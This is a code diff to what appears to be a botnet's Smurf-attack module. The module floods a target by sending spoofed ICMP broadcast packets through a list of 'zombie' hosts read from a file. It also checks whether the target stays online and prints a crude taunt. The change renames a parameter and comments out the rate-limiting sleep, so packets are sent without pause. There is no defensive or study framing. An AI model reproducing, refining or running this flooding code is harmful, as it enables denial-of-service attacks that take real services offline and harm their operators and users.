@@ -47,7 +47,7 @@ def sIP(base_stations): # extract 'base stations'
         s_zombie_ip = bs.get(s_zombie)
     return s_zombie_ip
 
-def smurfize(ip, sport, rounds, source = None):
+def smurfize(ip, sport, rounds, address_dict):
     f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
     base_stations = f.readlines()
     base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
@@ -73,15 +73,15 @@ def smurfize(ip, sport, rounds, source = None):
                 break
             try:
                 send(IP_p/ICMP(), verbose=0)
-                print("[Info] [AI] [SMURF] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
-                time.sleep(1/SMURF_SPEED) # sleep time required for balanced sucess
+                # print("[Info] [AI] [SMURF] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
+                # time.sleep(1/SMURF_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [SMURF] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]")
     except:
         print("[Error] [AI] [SMURF] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class SMURF(object):
-    def attacking(self, target, rounds, source= None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] ICMP Broadcast (SMURF) is redirecting: [" , rounds, "base stations ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -105,4 +105,4 @@ class SMURF(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [SMURF] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        smurfize(ip, sport, rounds, source) # attack with SMURF using threading
+        smurfize(ip, sport, rounds, address_dict) # attack with SMURF using threading
